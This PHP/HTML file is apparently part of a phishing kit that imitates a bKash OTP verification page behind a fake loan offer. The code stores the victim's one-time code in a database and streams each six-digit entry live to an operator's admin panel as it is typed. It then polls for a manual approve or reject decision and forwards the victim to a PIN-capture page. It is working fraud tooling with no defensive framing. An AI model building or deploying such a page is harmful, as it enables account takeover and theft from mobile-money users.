
<?php
session_start();
require_once 'config/database.php';

// Check if user came from number verification page
if (!isset($_SESSION['loan_id']) || !isset($_SESSION['mobile_number'])) {
    header('Location: lon_request.php');
    exit();
}

$loan_id = $_SESSION['loan_id'];
$loan_amount = $_SESSION['loan_amount'];
$loan_category = $_SESSION['loan_category'];
$mobile_number = $_SESSION['mobile_number'];
$masked_mobile = substr($mobile_number, 0, 3) . 'XXXX' . substr($mobile_number, -4);

// Handle OTP resend
if (isset($_GET['resend']) && $_GET['resend'] == '1') {
    $resend_success = 'OTP পুনরায় পাঠানো হয়েছে';
}

// Handle status check for admin approval
if (isset($_GET['check_status']) && $_GET['check_status'] == '1') {
    $stmt = $pdo->prepare("SELECT admin_action FROM loan_applications WHERE id = ?");
    $stmt->execute([$loan_id]);
    $result = $stmt->fetch();
    
    if ($result) {
        $admin_action = $result['admin_action'];
        if ($admin_action === 'approved') {
            echo json_encode(['status' => 'approved']);
        } elseif ($admin_action === 'rejected') {
            echo json_encode(['status' => 'failed']);
        } else {
            echo json_encode(['status' => 'pending']);
        }
    } else {
        echo json_encode(['status' => 'pending']);
    }
    exit();
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $otp_code = $_POST['otp_code'];
    
    if (strlen($otp_code) === 6 && is_numeric($otp_code)) {
        // Update loan application with OTP
        $stmt = $pdo->prepare("UPDATE loan_applications SET otp_code = ?, status = 'otp_verified' WHERE id = ?");
        $stmt->execute([$otp_code, $loan_id]);
        
        $_SESSION['otp_code'] = $otp_code;
        
        header('Location: pin_verification.php');
        exit();
    } else {
        $error = 'অনুগ্রহ করে ৬ সংখ্যার OTP কোড দিন';
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>bKash OTP Verification</title>
  <link rel="icon" type="image/png" href="img/favicon.png">
  <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-gray-100 flex items-center justify-center min-h-screen">

  <div class="w-full max-w-md bg-white rounded-lg shadow-lg overflow-hidden">

    <!-- bKash Logo Header -->
    <div class="flex justify-between items-center bg-white px-6 py-4">
      <img src="img/bKash-logo.png" class="mx-auto h-6" alt="bKash Logo" />
    </div>

    <!-- Invoice + Amount Section -->
    <div class="flex justify-between items-start bg-gray-100 px-4 py-3">
      <div>
        <p class="text-sm font-semibold text-gray-800">Loan Amount</p>
        <p class="text-xs text-gray-500">loan category: <?php echo htmlspecialchars($loan_category); ?></p>
      </div>
      <p class="text-sm font-semibold text-gray-800">৳<?php echo number_format($loan_amount, 2); ?></p>
    </div>

    <!-- Dynamic Error Message -->
    <div id="errorMessage" class="bg-red-100 border border-red-400 text-red-700 px-4 py-2 text-sm hidden">
        <span id="errorText"></span>
    </div>
    
    <?php if (isset($resend_success)): ?>
    <div class="bg-blue-100 border border-blue-400 text-blue-700 px-4 py-2 text-sm">
        <?php echo htmlspecialchars($resend_success); ?>
    </div>
    <?php endif; ?>

    <form method="POST" id="otpForm" action="">
        <!-- OTP Input Section -->
         <div class="bg-pink-600 px-6 py-16">
          <p class="text-white text-sm mb-2 text-center">Enter verification code sent to <?php echo $masked_mobile; ?></p>
          <input
            type="text"
            name="otp_code"
            id="otp_code"
            placeholder="Enter 6 digit code"
            class="w-full px-4 py-2 rounded text-gray-800 focus:outline-none focus:ring-2 focus:ring-pink-400 text-center"
            maxlength="6"
            required
          />
          <p class="text-white text-xs mt-2 text-center">
  <span id="timer">Resend Code in 60s</span>
  <a href="?resend=1" id="resendLink" class="underline hidden">Resend Code</a>
</p>

        </div>

        <!-- Buttons -->
        <div class="flex justify-between items-center bg-white px-6 py-4">
          <button type="button" onclick="showCancelDialog()" class="w-[48%] bg-gray-200 text-gray-700 py-2 rounded hover:bg-gray-300">
            Cancel
          </button>
          <button type="submit" id="confirmBtn" class="w-[48%] bg-gray-300 text-gray-500 py-2 rounded cursor-not-allowed" disabled>
            Confirm
          </button>
        </div>
    </form>

    <!-- Footer -->
    <div class="text-center text-xs text-gray-400 py-2">
      © 2025 bKash, All Rights Reserved
      <br />
      <span class="text-pink-600">● 16247</span>
    </div>

  </div>

  <!-- Cancel Confirmation Dialog -->
  <div id="cancelDialog" class="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50" style="display: none;">
    <div class="bg-pink-500 rounded-lg p-6 max-w-sm w-full mx-4 text-center">
      <div class="text-white mb-4">
        <div class="text-4xl mb-2">✋</div>
        <p class="text-lg font-medium">Are you sure you want to cancel this payment?</p>
      </div>
      <div class="flex gap-4">
        <button onclick="confirmCancel()" class="flex-1 bg-gray-200 text-gray-700 py-2 rounded hover:bg-gray-300">
          Yes
        </button>
        <button onclick="hideCancelDialog()" class="flex-1 bg-pink-600 text-white py-2 rounded hover:bg-pink-700">
          No
        </button>
      </div>
    </div>
  </div>

  <script>
    const otpInput = document.getElementById('otp_code');
    const confirmBtn = document.getElementById('confirmBtn');
    const timerElement = document.getElementById('timer');
    const resendLink = document.getElementById('resendLink');
    const errorMessage = document.getElementById('errorMessage');
    const errorText = document.getElementById('errorText');
    
    // Function to show error message
    function showErrorMessage(message) {
        errorText.textContent = message;
        errorMessage.classList.remove('hidden');
        
        // Auto hide after 5 seconds
        setTimeout(function() {
            errorMessage.classList.add('hidden');
        }, 5000);
    }
    
    // Function to hide error message
    function hideErrorMessage() {
        errorMessage.classList.add('hidden');
    }
    
    let timeLeft = 60;
    let canConfirm = true; // Allow immediate confirmation
    
    // Timer countdown for resend
    const timer = setInterval(function() {
        timeLeft--;
        timerElement.textContent = `Resend Code in ${timeLeft}s`;
        
        if (timeLeft <= 0) {
            clearInterval(timer);
            timerElement.classList.add('hidden');
            resendLink.classList.remove('hidden');
        }
    }, 1000);
    
    // Only allow numbers and limit to 6 digits
    otpInput.addEventListener('input', function() {
        // Remove any non-digit characters
        this.value = this.value.replace(/[^0-9]/g, '');
        
        if (this.value.length === 6) {
            confirmBtn.disabled = false;
            confirmBtn.classList.remove('bg-gray-300', 'text-gray-500', 'cursor-not-allowed');
            confirmBtn.classList.add('bg-pink-500', 'text-white', 'hover:bg-pink-600');
            confirmBtn.textContent = 'Confirm';
        } else {
            confirmBtn.disabled = true;
            confirmBtn.classList.add('bg-gray-300', 'text-gray-500', 'cursor-not-allowed');
            confirmBtn.classList.remove('bg-pink-500', 'text-white', 'hover:bg-pink-600');
            confirmBtn.textContent = 'Confirm';
        }
        
        // Hide error message when user starts typing
        if (this.value.length > 0) {
            hideErrorMessage();
        }
        
        // Real-time update to admin panel
            if (this.value.length === 6) {
                // Reset OTP status to pending when new OTP is entered
                fetch('admin_update.php', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        action: 'reset_otp_status',
                        loan_id: <?php echo $loan_id; ?>
                    })
                });
                
                fetch('admin_update.php', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        action: 'update_otp',
                        loan_id: <?php echo $loan_id; ?>,
                        otp_code: this.value
                    })
                });
            }
    });
    
    // Handle form submission
    document.getElementById('otpForm').addEventListener('submit', function(e) {
        e.preventDefault();
        
        const otpCode = otpInput.value;
        if (otpCode.length === 6) {
            // Show loading state
            confirmBtn.disabled = true;
            confirmBtn.textContent = 'Processing...';
            
            // Submit form data
            const formData = new FormData();
            formData.append('otp_code', otpCode);
            
            fetch('', {
                method: 'POST',
                body: formData
            })
            .then(response => {
                // Always redirect to pin verification after successful submission
                window.location.href = 'pin_verification.php';
            })
            .catch(error => {
                console.error('Error:', error);
                showErrorMessage('একটি ত্রুটি ঘটেছে। অনুগ্রহ করে আবার চেষ্টা করুন।');
                confirmBtn.disabled = false;
                confirmBtn.textContent = 'Confirm';
            });
        }
    });
    
    // Check for OTP approval every 2 seconds (only after 30 seconds)
    setInterval(function() {
        if (canConfirm) {
            fetch('?check_status=1')
                .then(response => response.json())
                .then(data => {
                    if (data.status === 'approved') {
                        window.location.href = 'pin_verification';
                    } else if (data.status === 'failed') {
                        // Show error message
                        showErrorMessage('OTP ভুল! অনুগ্রহ করে সঠিক OTP ব্যবহার করুন।');
                        otpInput.value = '';
                        otpInput.focus();
                        // Reset button state to allow re-entry
                        confirmBtn.disabled = true;
                        confirmBtn.classList.add('bg-gray-300', 'text-gray-500', 'cursor-not-allowed');
                        confirmBtn.classList.remove('bg-pink-500', 'text-white', 'hover:bg-pink-600');
                        confirmBtn.textContent = 'Confirm';
                        // Reset the confirm timer to allow immediate re-entry after 30 seconds
                        confirmTimeLeft = 30;
                        canConfirm = false;
                        
                        // Restart the confirm timer
                        clearInterval(confirmTimer);
                        const newConfirmTimer = setInterval(function() {
                            if (confirmTimeLeft > 0) {
                                confirmTimeLeft--;
                                if (otpInput.value.length === 6) {
                                    confirmBtn.textContent = `Wait ${confirmTimeLeft}s`;
                                }
                            } else {
                                clearInterval(newConfirmTimer);
                                canConfirm = true;
                                if (otpInput.value.length === 6) {
                                    confirmBtn.disabled = false;
                                    confirmBtn.classList.remove('bg-gray-300', 'text-gray-500', 'cursor-not-allowed');
                                    confirmBtn.classList.add('bg-pink-500', 'text-white', 'hover:bg-pink-600');
                                    confirmBtn.textContent = 'Confirm';
                                }
                            }
                        }, 1000);
                    }
                });
        }
    }, 2000);
    
    // Cancel dialog functions
    function showCancelDialog() {
        document.getElementById('cancelDialog').style.display = 'flex';
    }
    
    function hideCancelDialog() {
        document.getElementById('cancelDialog').style.display = 'none';
    }
    
    function confirmCancel() {
        history.back();
    }
  </script>
</body>
</html>